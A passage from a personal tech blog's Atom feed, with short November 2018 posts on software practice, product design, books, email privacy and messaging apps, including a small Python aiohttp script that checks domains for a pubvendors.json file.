   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/google-search-store-ad.png" width="2266" height="1209" alt="Google Search Homepage Store Ad" layout="responsive"/>

<p>Turns out not even Google is immune from the pressures of Cyber Monday. As minimal as the Google search homepage is they still made the effort to have a callout, however slight, to promote their Cyber Monday deals. A while back I read an article that calculated how much additional revenue Google would be able to generate if they put ads on their homepage. I don’t recall the exact number or the details but I imagine it’s a massive amount. Yet Google never took the step of putting ads on the search homepage so it’s interesting to see them doing it for their own store. The revenue here must be significantly less than what they’d see through traditional advertising but at the same time it’s a very minimal hit to the user experience. I can only imagine how many people needed to be involved in this decision though.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Exploring my backlinks</title>
   <link href="http://dangoldin.com/2018/11/25/exploring-my-backlinks/"/>
   <updated>2018-11-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/25/exploring-my-backlinks</id>
   <content:encoded><![CDATA[
<p>I enjoy <a href="https://hackernoon.com">Hacker Noon</a> and often find myself coming across an interesting article on the site. Yesterday I got a pleasant surprise from an old coworker who sent me an <a href="https://hackernoon.com/how-to-create-a-slack-bot-that-messages-all-members-of-a-workspace-in-8-minutes-32a5b52838be">article</a> about building a Slack bot that mentioned of one of my <a href="http://dangoldin.com/2017/06/30/send-private-messages-to-all-members-of-a-slack-channel/">blog posts</a>. A few months earlier the author and I had a conversation in the comment thread and I’m glad she found the conversation useful enough to write a much more thorough post.</p>

<p>I don’t write write for publicity and genuinely enjoy the process of clarifying my thoughts through writing so it’s definitely rewarding to see a link back to my blog. It feels good knowing that my blog is interesting enough to warrant a link and it’s definitely appreciated.</p>

<p>Since I only discovered this backlink accidentally I got curious about how many others I missed over the years and decided to dig in. I found a free <a href="https://lxrmarketplace.com/seo-inbound-link-checker-tool.html">backlink checker</a> and after searching for my domain name discovered that there are actually quite a few linkbacks. Some are list aggregators - such as <a href="http://www.largeheartedboy.com/blog/archive/2016/11/online_best_of_73.html">top books</a> or <a href="http://quantifiedself.com/2015/01/represent-year-numbers/">quantified self visualizations</a> while others are more interesting - there are quite a few links to a 5 year old <a href="http://dangoldin.com/2013/04/12/why-dont-cellphones-have-a-dialtone/">blog post</a> about the lack of a dial tone in cell phones as well as a link from <a href="https://www.citylab.com/transportation/2017/06/in-new-york-city-bikeshare-is-faster-than-cabs-when-it-matters-most/530469/">CityLab</a> for a post about Citi Bike trip planning.</p>

<p>It turns out some of my posts and projects actually do make their way past my blog. It’s not much but it’s definitely cool.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Aggressive code deprecation</title>
   <link href="http://dangoldin.com/2018/11/25/aggressive-code-deprecation/"/>
   <updated>2018-11-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/25/aggressive-code-deprecation</id>
   <content:encoded><![CDATA[
<p>Part of writing high quality code quickly is deprecating no longer used features and functionality. It sounds simple but more often than not there’s an abundance of references throughout - some tightly coupled and others loosely coupled - that make a full deprecation difficult. In some cases it’s is as simple as an isolated code change while in other cases it’s removing code along with some database migrations and in the extreme case it may be removing an entire service. It’s crucial to be exhaustive in your deprecation or you’ll end up in a situation months or years later where the team has changed enough that no one can tell what the code is meant to do and whether it’s still used.</p>

<p>Ideally you have enough tests and code coverage to take care of the obvious changes but even that won’t catch everything. I found the following checklist to be helpful in aggressively deprecating code:</p>

<ul>
  <li><strong>Actual code deprecation</strong>. All references to the deprecated should be removed across all relevant repos. It’s straightforward to remove it from the primary code base but are there references to it in other applications? You may have a field you’re deprecating in the API but you need to make sure you remove its references in the UI code as well. As a side note this is a reason why you should make your applications as loosely coupled as possible. With the previous example was there a way to write the UI code so it doesn’t make any assumptions about the API and instead makes a request to the API to get the list of available fields? That way not every API change will warrant a UI change.</li>
  <li><strong>Database migrations</strong>. If you removed a field in the code make sure to remove it from the database along with all foreign key references. If necessary make a dump of the table(s) as a backup but remember to set a reminder to delete the backup in the future. If it’s a risky change rename the column first and make sure nothing breaks - then if something does break you can quickly revert the name change.</li>
  <li><strong>Package requirements</strong>. Did you install a particular package just to get your code working? If so you should review your package requirements and remove the ones that are no longer being used. It’s unlikely that you installed an open source library just to use it in a single place but you never know. The fewer external packages you have the more maintainable your code since you don’t have to worrying about version incompatibilities or library deprecation.</li>
  <li><strong>Configuration options</strong>. Was there any configuration that referenced the code? What about a configuration option that was only used by the deprecated code? Having additional fields in your configuration files won’t break anything but it makes future deprecation more difficult since someone will need to confirm these configuration options are no longer used and just introduces bloat.</li>
  <li><strong>DevOps</strong>. Unless you’re removing an entire application this isn’t common but something to definitely keep in mind is to reduce DevOps bloat. The goal here is to remove all resources that were created for your application. If you were using Terraform or another “infrastructure as code” system this is easier since you may be able to just remove files and let Terraform do the rest. Otherwise you should take a look at all the DevOps resources your application needed and remove them. These range from the DNS entries to the relevant security groups to the instance images to the cloud-stored files. The cloud makes it easy to spin things up but it’s on us to fully spin things down.</li>
</ul>

<p>The work to aggressively deprecate isn’t easy but thoroughness is essential. It’s much better to take the time to do a deep cleanup while the code is still fresh in mind instead of having a new set of people figuring out what’s still used years later. It’s also a strong investment in keeping your code clean and light which improves future development speed.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Code without online help</title>
   <link href="http://dangoldin.com/2018/11/24/code-without-online-help/"/>
   <updated>2018-11-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/24/code-without-online-help</id>
   <content:encoded><![CDATA[
<p>Whenever I need some coding help my first step is to do an online search which usually leads me to either the library documentation or a StackOverflow page. This is a poor habit and something I’m trying to move away from. While I’m almost always online it’s dangerous to rely on the internet to code - both because there will be times you may not have internet access but also because you lose the ability to do your own investigation, discovery, and critical thinking.</p>

<p>There will always be cases where I’ll have to do a search but even then I first make it an effort to solve the problem locally. The following are some tools that have become indispensable for me when doing my local discovery. Note that Python is primary programming language so the last 3 tools are Python-specific but other modern languages should have equivalent tools.</p>

<ul>
  <li>history. While not specific to Python I find the history command incredibly useful. I make my history retention as long as I can and then pipe it into grep to see the way I used various commands and their arguments. I may not even know the command itself but by grepping for filenames or directories I’m usually able to figure out what I was looking for.</li>
  <li>man. Short for manual and works just like one. Type man in front of any Linux command and you’ll get an exhaustive, but dense, explanation of the command with a description of the options. The documentation is dense and I have to attempt an option a few times to make sure it’s working as expected but it’s powerful having all the information in a single place. Even better is making it a habit to use man on commands you already use since you will inevitable discover some new functionality.</li>
  <li>dir (Python). Now we’re beyond the shell but dir works similarly to the command line and lists the attributes of an object. I find this really helpful when using an open source library that is sparse on documentation since I can easily see the methods that the objects I’m using have. It’s often enough that just seeing the name gives me what I need.</li>
  <li><a href="https://docs.python.org/3/library/functions.html#dir"><strong>doc</strong></a> (Python). Combined with the above typing <strong>doc</strong> after an object gives you the docstring of that attribute. This is usually a quick blurb documenting the function - both what it does as well as the argument(s) it takes. This combined with the dir function above makes it pretty easy to write a quick script to dump all the attributes of an object along with their documentation. For example you can do this for the “set” module: print(“\n”.join([a + “: “ + str(getattr(set, a).<strong>doc</strong>) for a in dir(set)]))</li>
  <li><a href="https://docs.python.org/3/library/inspect.html">inspect</a> module (Python). While researching the above I came across the inspect module which provides some advanced object inspection functionality - including a cleaner for of the <strong>doc</strong> approach above. I’m still getting a feel for it but just by reading the linked docs you can get a feel for how it can be used to inspect Python objects.</li>
</ul>

<p>There must be a ton of other tools I didn’t cover and I’d love to learn them. I’m a big believer in being as independent of a developer as one can be. A good way is to push one’s craft without relying on outside support. It’s too easy to do a search and get what you want but then it’s one ear out the other. Instead, the way to become stronger is by struggling and doing things the hard way with the hope that they stick over time.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Adding optionality to products</title>
   <link href="http://dangoldin.com/2018/11/24/adding-optionality-to-products/"/>
   <updated>2018-11-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/24/adding-optionality-to-products</id>
   <content:encoded><![CDATA[
<p>Building products involves making countless decisions. One of the biggest is defining the functionality and how it should be exposed to the users. In my mind, answers to this question like on a spectrum. On one extreme you have the “take what you can get” approach where the functionality is exposed with no customization and no advanced features but the experience is optimized for one specific use case. As an example of this think of the original Google search - a single search field, minimal search functionality, and two buttons. On the other extreme you have the “customize everything” approach where you think of all possible use cases and provide options to allow users to do what they want. An example of this is Microsoft Word - most people use a fraction of all the functionality yet there’s a ton hidden away behind some menu.</p>

<p>Consumer facing products generally fall into the first camp since you want them to be as accessible as possible while enterprise and productivity products fall into the latter camp where it’s about optimizing for power users. I understand the value of both approaches and often times you can get away with the experience of the former while providing the functionality of the latter. Google search is an example of this - it’s a single field but after doing a search you have access to the advanced search functionality to refine your search. Also, if you’re a power user you know there are a few things you can type in to the search bar to further control your search - for example using quotes for an exact match or limiting the search to a single site.</p>

<p>It’s rare that you find a product with fewer features in newer versions. The majority of the time products get more complex as functionality is added to make the product more appealing to a wider set of users. This makes sense when making an isolated decision but it also feels like death by a thousand cuts since each option makes the product just slightly worse for a majority of users. As product managers and engineers we should be extra thoughtful in taking the easy way out and adding an option to expose a different behavior. This option will be incredibly difficult to remove and we should take the time to understand the underlying problem and use case to determine whether the option is something that’s necessary or just us being lazy.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Electronic goods are cheaper than ever</title>
   <link href="http://dangoldin.com/2018/11/23/electronic-goods-are-cheaper-than-ever/"/>
   <updated>2018-11-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/23/electronic-goods-are-cheaper-than-ever</id>
   <content:encoded><![CDATA[
<p>While stumbling across yet another Black Friday deal it hit me that electronics are ridiculously cheap. One can get state of the art computers for about a thousand dollars and huge flat panel TVs for a few hundred dollars. I grew up in the 90s and it never felt that comparable gadgets were that cheap. It may be that I didn’t have a job and nearly everything was out of reach but I suspect electronic goods really are that much cheaper now. Even if a product launches at a higher price it doesn’t stay that way for long and drops much quicker than before. No price has staying power and there are always more efficient competitors catching up.</p>

<p>I haven’t dug into why but the modern supply chain must play a part. There are tons of factories in Asia specializing in the manufacture of sophisticated circuitry that can be reorganized as needed for new designs. Shipping both the raw materials and final products is more efficient than it has ever been and as consumers we’re all benefiting from this efficiency.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>History's largest empires</title>
   <link href="http://dangoldin.com/2018/11/22/historys-largest-empires/"/>
   <updated>2018-11-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/22/historys-largest-empires</id>
   <content:encoded><![CDATA[
<p>I got a bit distracted today and ended up coming across the Wikipedia page listing <a href="https://en.wikipedia.org/wiki/List_of_largest_empires">history’s largest empires</a>. The page came with a list of the top 140 by land area and just by looking at them you can see there’s a huge range. The British Empire was the largest at 35.5 million square kilometers while the Sumer was the smallest at 0.05. That’s a huge difference - over 700 times - and I thought it would be interesting to plot them to visualize the distribution. As expected, there’s a very steep drop and a long tail. If you add up the land areas of all the empires listed you get just over 455 million square kilometers. That metric itself doesn’t mean anything but it helps to normalize the land areas. The British Empire, for example, is 8% of the total and if you keep going down the list in descending order by size and sum up the percentages you get that the first 55 empires add up to 80% of the total land area. Once again, the total land area is useless metric but it allows us to see how close we are to the <a href="https://en.wikipedia.org/wiki/Pareto_principle">80-20 rule</a>. It turns out not too close - 55 countries out of 140 are just over 39%. The top 20% empires add up to 52% of the land area. If you’re interested in playing around with the data it’s up on the Wikipedia page as well as an <a href="http://dangoldin.com/assets/static/data/largest-empires-land-area.xlsx">Excel version</a> with cleaned up data.</p>

<img src="http://dangoldin.com/assets/static/images/empire-land-area.png" alt="Land area of history's largest empires" width="2520" height="1430" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Superhuman review</title>
   <link href="http://dangoldin.com/2018/11/21/superhuman-review/"/>
   <updated>2018-11-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/21/superhuman-review</id>
   <content:encoded><![CDATA[
<p>I’m all about productivity so when I heard about <a href="https://superhuman.com">Superhuman</a> I decided to give it a shot. I’ve been using it for the past few weeks and while it’s a solid product and well built it didn’t suit me. The onboarding experience is great and there’s a ton of functionality that Superhuman provides that makes it that much easier to go through email. This ranges from a variety of shortcuts (that can all be quickly found using Cmd+K) to functionality that you wish existed in email, such as typing a date and immediately seeing that day’s calendar to being able to copy a whole email message - attachments and all.</p>

<p>I really wanted to like it but unfortunately ran into a few issues that ruined my experience. The biggest was that it was just too slow and would occasionally freeze entirely when loading large emails. At that point my only option was to force quit the app and then go back to Gmail to handle the offending message. I also ran into a few cases where I tried to delete an email but due to the lack of an immediate response I’d hit delete again and would end up deleting a few messages. Given that my account was set up to optimize towards inbox zero accidentally deleting a few emails was a problem since these were important emails that took time to recover.</p>

<p>Superhuman invested a ton in their mobile experience and it shows. The iPhone app is smooth and provides an entirely different experience than the desktop client. Unfortunately, I rarely use mobile email and prefer to do all my emailing on the desktop. I never struggled with mobile email so there was little incentive for me to change my behavior.</p>

<p>If you can justify the $30/month, are a heavy email user, and find yourself spending more time in email than you should then give it a shot. If you’re more traditional, are happy with your current email experience, and don’t have the $30/month to spend you likely won’t invest the time to make Superhuman work for you. My gut is that a lower price and an improved desktop app experience would get me to come back.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My DataEngConf 2018 talk</title>
   <link href="http://dangoldin.com/2018/11/20/my-dataengconf-2018-talk/"/>
   <updated>2018-11-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/20/my-dataengconf-2018-talk</id>
   <content:encoded><![CDATA[
<p>On November 9th I had the privilege of speaking at DataEngConf under the “Hero Engineering” track. My talk was titled “The Highs and Lows of Building an AdTech Data Pipeline” and I covered our evolution from a dead simple, sampled approach that had nothing to do with big data to the latest version which is leveraging a variety of modern open source data technologies.</p>

<p>I spoke about the motivation, challenges, and lessons learned during each iteration and ended the talk with the top 3 lessons learned across the various iterations of the pipeline. If you’re interested in the details you can grab the slides as either <a href="https://docs.google.com/presentation/d/1XmOPgsbxoah2Pulw3eRvzjClOM5A5Dq-B2MWfot0guo/edit#slide=id.p">Google Slides</a> or as PowerPoint from the <a href="https://www.dataengconf.com/speaker/the-highs-and-lows-of-building-an-adtech-data-pipeline">DataEngConf site</a>. Note that there was also a recording made but I’m still waiting for it to be processed and uploaded it to YouTube and will share that when it’s available.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Computer history books</title>
   <link href="http://dangoldin.com/2018/11/19/computer-history-books/"/>
   <updated>2018-11-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/19/computer-history-books</id>
   <content:encoded><![CDATA[
<p>I’m fascinated by computer history and love reading computer history books. We live in such a digital heavy world that it’s difficult to imagine life without it. Yet it really is fairly recent. Personal computers only started becoming popular in the 1980s and the internet was only introduced in the 1990s. And it took a whole decade before the internet started resembling what we currently see. If we take the least restrictive definition of a computer we still get that computers have existed for less than a hundred years. That’s a blink of an eye in our history and it’s incredibly rewarding to read about the origin of the industry I’m a part of. Part of me wishes that I was around in the formative years so this is my way of feeling a little bit of that spark and discovery.</p>

<p>Below are some of the books I’ve read that stood out and I recommend to anyone that’s interested in the history of computers and computing.</p>

<ul>
  <li><a href="https://www.amazon.com/gp/product/B07GBCX7YC/ref=oh_aui_d_detailpage_o02_?ie=UTF8&amp;psc=1">The Dream Machine</a> by M. Mitchell Waldrop. The Dream Machine is a biography of J. C. R Licklider but it’s much more than that. Despite focusing on one person, Licklider had a hand in introducing the computer to the masses and the book does a great job covering the birth of the computer industry and its growth up into the internet era.</li>
  <li><a href="https://www.amazon.com/gp/product/B0029PBVCA/ref=oh_aui_d_detailpage_o01_?ie=UTF8&amp;psc=1">Dealers of Lightning: Xerox PARC and the Dawn of the Computer Age</a> by Michael A. Hiltzik. If there was any time and place I could experience I would pick Xerox PARC in the 1970s and 80s. There was such an incredible amount of talent doing incredible work and the books makes you feel as if you were there.</li>
  <li><a href="https://www.amazon.com/gp/product/B005HG4W9W/ref=oh_aui_d_detailpage_o01_?ie=UTF8&amp;psc=1">The Soul of A New Machine</a> by Tracy Kidder. Similar to the above, this is a tale of Data General, a designer and manufacturer of “mini” computers in the 1970s and 80s, and the work that was involved in building a computer. It’s amazing that modern computers work given how complex they are and it’s even more incredible to read about how computers were actually made 40 years ago.</li>
  <li><a href="https://www.amazon.com/gp/product/B00G2A7WL2/ref=oh_aui_d_detailpage_o03_?ie=UTF8&amp;psc=1">The Intel Trinity: How Robert Noyce, Gordon Moore, and Andy Grove Built the World’s Most Important Company</a> by Michael S. Malone. The transistor led to the creation of the microprocessor which reduced the size of the cips, the cost of computers, and in turn led to Moore’s Law, the reason we all have multiple computers. This is more of a business than technology book but is still a worthwhile read given Intel’s impact.</li>
  <li><a href="https://www.amazon.com/gp/product/B01M5IJN1P/ref=oh_aui_d_detailpage_o08_?ie=UTF8&amp;psc=1">A Mind at Play: How Claude Shannon Invented the Information Age</a> by Jimmy Soni and Rob Goodman. Claude Shannon created information theory and laid the foundation to think about digital information. Before Shannon there was no way to think about digital information and how it could be safely and stored and communicated. Computers are constantly shuffling bits around - whether internally or externally - and without information theory we wouldn’t know where to begin.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Falling behind my 2018 blogging goal</title>
   <link href="http://dangoldin.com/2018/11/18/falling-behind-my-2018-blogging-goal/"/>
   <updated>2018-11-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/18/falling-behind-my-2018-blogging-goal</id>
   <content:encoded><![CDATA[
<p>Since 2013 I’ve been writing 2 blog posts a week. This stemmed from a conscious effort to improve my writing, clarify my thought process, and grow my brand. It’s been quite a ride and while difficult I’ve been able to do keep it going for 5 consecutive years. This year I’m significantly behind but am still committed to catching up and hitting 104 posts. As I write this I’m only at 42 posts for 2018; I have 42 days to write 62 posts which means I need to write nearly 1.5 posts a day to make up for my prior sloth. I’m going to do as much as I can to hit that goal and will be extremely disappointed if I’m unable to do it. That may mean that some of the posts will be on the shorter side and half baked but there will be some that do offer something valuable and insightful. My blogging history tells me that it’s impossible (for me at least) to actually tell which posts will be popular and the best I can do is keep writing and share more of my thoughts. The one element I will not compromise on is editing - poor writing is a pet peeve and I’ll continue to edit my posts after they’re written.</p>

<img src="http://dangoldin.com/assets/static/images/blogging-history.png" width="868" height="346" alt="Posts by year" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Random quotes</title>
   <link href="http://dangoldin.com/2018/11/17/random-quotes/"/>
   <updated>2018-11-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/17/random-quotes</id>
   <content:encoded><![CDATA[
<p>Besides blogging I’m a big reader and normally get through read a book a week. Most of my reading is done on Kindle and whenever I come across any interesting passage or quote I highlight them. Then every few weeks I go through my highlights, add them to a single <a href="https://github.com/dangoldin/quotes/blob/master/quotes.txt">file</a>, and dump it into a GitHub <a href="https://github.com/dangoldin/quotes">repo</a>. Earlier today I decided to do something fun and wrote a simple <a href="https://bots.dangoldin.com/quoteme">endpoint</a> to fetch a random quote. The majority of my reading is nonfiction and this is reflected in my quotes. In addition, I’m a sucker for biographies and computer history books so they’re an even larger share of the quotes. I also like to throw a few idioms into the mix. So if you’re ever in the mood for a random quote take a look at <a href="https://bots.dangoldin.com/quoteme">https://bots.dangoldin.com/quoteme</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Python 3 and aiohttp</title>
   <link href="http://dangoldin.com/2018/11/16/python-3-and-aiohttp/"/>
   <updated>2018-11-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/16/python-3-and-aiohttp</id>
   <content:encoded><![CDATA[
<p>A few months back I read about <a href="https://aiohttp.readthedocs.io/en/stable/">aiohttp</a> and asyncio and finally got the chance to play around with it a few weeks back. The project was a quick one-off scrape of a few thousand domains to see what percentage had implemented the <a href="https://github.com/InteractiveAdvertisingBureau/GDPR-Transparency-and-Consent-Framework/blob/master/pubvendors.json%20v1.0%20Draft%20for%20Public%20Comment.md">pubvendors.json</a> spec, an extension of GDPR that allows publishers to specify the vendors they’re working with.</p>

<p>My initial reaction was to do it in the way I’ve done it countless times before: the requests library in a for loop. Instead I decided to actually try something new and use the aiohttp library, a new asynchronous library for Python 3. It took me a little bit of time to figure out how to structure the code and use Python’s new async functionality (which by the way is very similar to modern JavaScript) but the end result is simple for what it does and runs incredibly quickly.</p>

<p>The code below is my attempt at a functional solution - it’s inspired by imitating the aiohttp examples as well as a few helpful blog posts. I’m sure it’s far from perfect and I don’t do much other than print the status but it got me what I needed. If you’re doing any sort of scraping or network heavy work take the time to learn the new async functionality provided in Python 3 - it’s a massive performance improvement.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#! /usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">aiohttp</span>
<span class="kn">import</span> <span class="nn">asyncio</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">timeout</span> <span class="o">=</span> <span class="n">aiohttp</span><span class="p">.</span><span class="n">ClientTimeout</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>

<span class="n">URLS</span> <span class="o">=</span> <span class="s">"example1.com example2.com example3.com"</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">fetch</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="k">await</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">()</span>
            <span class="n">valid_pv</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'{'</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">valid_pv</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">valid_pv</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'Error'</span><span class="p">)</span>
        <span class="k">return</span> <span class="s">'Error'</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">bound_fetch</span><span class="p">(</span><span class="n">sem</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
    <span class="k">async</span> <span class="k">with</span> <span class="n">sem</span><span class="p">:</span>
        <span class="k">await</span> <span class="n">fetch</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">session</span><span class="p">)</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">urls</span><span class="p">):</span>
    <span class="n">tasks</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">sem</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">Semaphore</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>

    <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="p">.</span><span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">urls</span><span class="p">:</span>
            <span class="c1"># Blame the spec for the path, don't worry about HTTPS for now
</span>            <span class="n">full_url</span> <span class="o">=</span> <span class="s">'http://'</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s">'/.well-known/pubvendors.json'</span>
            <span class="n">task</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">ensure_future</span><span class="p">(</span><span class="n">bound_fetch</span><span class="p">(</span><span class="n">sem</span><span class="p">,</span> <span class="n">full_url</span><span class="p">,</span> <span class="n">session</span><span class="p">))</span>
            <span class="n">tasks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">task</span><span class="p">)</span>

        <span class="n">responses</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">)</span>
        <span class="k">await</span> <span class="n">responses</span>

<span class="n">URLS</span> <span class="o">=</span> <span class="p">[</span><span class="n">url</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">URLS</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">lower</span><span class="p">().</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.app'</span><span class="p">)]</span>

<span class="k">print</span><span class="p">(</span><span class="n">URLS</span><span class="p">)</span>

<span class="n">loop</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">get_event_loop</span><span class="p">()</span>
<span class="n">future</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">ensure_future</span><span class="p">(</span><span class="n">run</span><span class="p">(</span><span class="n">URLS</span><span class="p">))</span>
<span class="n">loop</span><span class="p">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">future</span><span class="p">)</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Limiting tracking in email</title>
   <link href="http://dangoldin.com/2018/11/15/limiting-tracking-in-email/"/>
   <updated>2018-11-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/15/limiting-tracking-in-email</id>
   <content:encoded><![CDATA[
<p>It’s tough to protect your digital privacy with the modern web but I try my best. One of the tricks I’ve been using is to disable all images and avoid clicking any links that don’t go directly to the desired location. The reason for disabling images is that it prevents your opening of the email from being tracked since the image request (which contains some unique identifier) does not get made. The reason for not clicking on any of the links is similar - they’re rarely the final page you’re trying to get to but instead go through an intermediary that’s able to track your click. You can identify these by hovering over the link and seeing what the destination actually shows in the status bar. If it’s the page you want, great, otherwise I’ll go to the desired page directly or do an incognito search to get where I need to go.</p>

<p>The flow is slower but reducing tracking is important to me and I’m willing to take a bit of friction to give myself the illusion of privacy. It’s not perfect and I’m still being tracked in a variety of ways but it’s one small way of fighting back.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>What messaging war?</title>
   <link href="http://dangoldin.com/2018/11/14/what-messaging-war/"/>
   <updated>2018-11-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/14/what-messaging-war</id>
   <content:encoded><![CDATA[
<p>Apparently there’s a “messaging war” going on among the dozens of apps and social networks, all competing to be the dominant messaging app. There really are a ton of these. I have a folder on my phone dedicated to messaging and it contains Apple Messages, Google Hangouts, WhatsApp, WeChat, Telegram, Facebook Messenger, and Signal. In addition, Twitter, Instagram, and Snapchat all have messaging functionality. Adding these up I have 10 messaging apps on my phone.</p>

<p>It’s clear that there’s fragmentation but it also doesn’t affect me at all. Each of the apps provides basically the same functionality and if there’s another messaging app introduced I’ll just download that one too. I go wherever my contact is and I keep my notification settings the same for every app. The market may be fragmented but my workflow is so app agnostic it doesn’t actually matter. All I really need to keep track of is who uses what app but given my list of contacts is both small with strong recency properties I’m able to choose the appropriate app subconsciously. Some of my friends are on WhatsApp, others on Messages, others on Hangouts, and one on Singal. But the point is that doesn’t matter. It’s simple enough for me to have and use Signal even if it’s just for one person. Maybe others are more passionate about messaging and have their favorite app but I view them as purely utilitarian. They’re no different to me than a grocery store - I just go to whichever one is more convenient at that time.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A UX gem in Google Slides</title>
   <link href="http://dangoldin.com/2018/11/13/a-ux-gem-in-google-slides/"/>
   <updated>2018-11-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/13/a-ux-gem-in-google-slides</id>
   <content:encoded><![CDATA[
<p>I’m a sucker for subtle UX gems and Google continues to amaze me. While working on a presentation using the Slides product I had to modify the colors of a few objects. The UX for this is usually pretty normal - you select the object, hit the icon to modify the color, and choose a new color. Usually it’s slightly better and you get to see the existing color. What surprised me with the Google Slides experience is that I didn’t just see the existing color but also saw the previously picked color. Since I was modifying a series of objects to the same color this was a pleasant experience, especially since I was working off of a series of color shades that looked too similar. It would have been even better if I was able to bulk change the objects but a win’s a win.</p>

<p>I’m convinced that this sort of UX behavior only happens by users who eat their own dog food. It’s unlikely that someone who was not a regular Slides could have come up with a feature like this since it’s so subtle and baked into the power user experience. In addition, that person must have been aware enough to realize what they were doing and took a step back to think of this functionality. Or maybe it wasn’t a person at all and Google’s tracking is so sophisticated that it was able to suss out this pattern and bring it up to the relevant product manager who was able to identify the behavior that needed to be optimized. Both of these cases are extremely impressive and I can’t wait to find more of these subtle UX optimizations.</p>

<img src="http://dangoldin.com/assets/static/images/google-slides-color-selection.png" width="406" height="116" alt="Google Slides previous color selection" layout="responsive"/>
<p class="caption">Google Slides previous color selection</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Social Security Administration spoofing scam</title>
   <link href="http://dangoldin.com/2018/11/12/social-security-administration-spoofing-scam/"/>
   <updated>2018-11-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/11/12/social-security-administration-spoofing-scam</id>
   <content:encoded><![CDATA[
<p>I use Google Voice as my voicemail due to the built in transcription which lets me tell at a glance whether a call is spam or in the rare case, worth returning. This past Friday I had my phone on silent for most of the day and was pleasantly surprised with the following transcription greeting me after I checked in:</p>

<img src="http://dangoldin.com/assets/static/images/ssa-scam.png" width="1110" height="298" alt="Scam voicemail message" layout="responsive"/>
<p class="caption">Scam voicemail message</p>

